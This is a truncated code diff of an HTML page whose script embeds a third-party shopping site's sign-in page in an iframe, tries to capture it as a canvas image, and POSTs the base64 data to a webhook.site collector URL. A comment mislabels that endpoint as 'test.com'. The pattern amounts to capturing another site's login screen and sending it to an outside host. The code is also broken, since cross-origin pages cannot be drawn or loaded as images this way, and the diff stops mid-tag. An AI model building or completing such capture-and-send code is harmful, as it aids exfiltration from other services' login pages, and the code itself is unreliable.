@@ -7,31 +7,38 @@
       var iframe = document.getElementById('myIframe');
       var iframeWindow = iframe.contentWindow || iframe.contentDocument.defaultView;
       
-      // Capture the screenshot of the first rendered content in the iframe
-      var canvas = document.createElement('canvas');
-      canvas.width = iframe.offsetWidth;
-      canvas.height = iframe.offsetHeight;
+      // Create an image element
+      var image = new Image();
       
-      var context = canvas.getContext('2d');
-      context.drawImage(iframe, 0, 0, iframe.offsetWidth, iframe.offsetHeight, 0, 0, iframe.offsetWidth, iframe.offsetHeight);
+      // Load the iframe content into the image
+      image.onload = function() {
+        var canvas = document.createElement('canvas');
+        canvas.width = iframe.offsetWidth;
+        canvas.height = iframe.offsetHeight;
       
-      // Convert the canvas image to a base64 data URL
-      var imageData = canvas.toDataURL('image/png');
+        var context = canvas.getContext('2d');
+        context.drawImage(image, 0, 0, iframe.offsetWidth, iframe.offsetHeight, 0, 0, iframe.offsetWidth, iframe.offsetHeight);
       
-      // Send the image data to the server-side endpoint on test.com
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://webhook.site/64f44dae-4f64-45a2-a827-43ca1c61a785', true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          console.log('Image sent successfully!');
-          alert('Image sent successfully!');
-        } else if (xhr.readyState === 4) {
-          console.error('Failed to send the image. Status: ' + xhr.status);
-          alert('Failed to send the image. Please try again.');
-        }
+        // Convert the canvas image to a base64 data URL
+        var imageData = canvas.toDataURL('image/png');
+      
+        // Send the image data to the server-side endpoint on test.com
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://webhook.site/64f44dae-4f64-45a2-a827-43ca1c61a785', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log('Image sent successfully!');
+            alert('Image sent successfully!');
+          } else if (xhr.readyState === 4) {
+            console.error('Failed to send the image. Status: ' + xhr.status);
+            alert('Failed to send the image. Please try again.');
+          }
+        };
+        xhr.send(JSON.stringify({ image: imageData }));
       };
-      xhr.send(JSON.stringify({ image: imageData }));
+      
+      image.src = iframe.src;
     }
   </script>
   <style>
@@ -43,7 +50,4 @@
 </head>
 <body>
   <h1>Capture and Send Image</h1>
-  <iframe id="myIframe" src="https://app.codashop.com/en-ph/sign-in" width="800" height="600" frameborder="0"></iframe>
-  <button onclick="captureAndSendImage()">Capture and Send Image</button>
-</body>
-</html>
+  <iframe id="myIframe" src="https://app.codashop.com/en-ph/sign-in
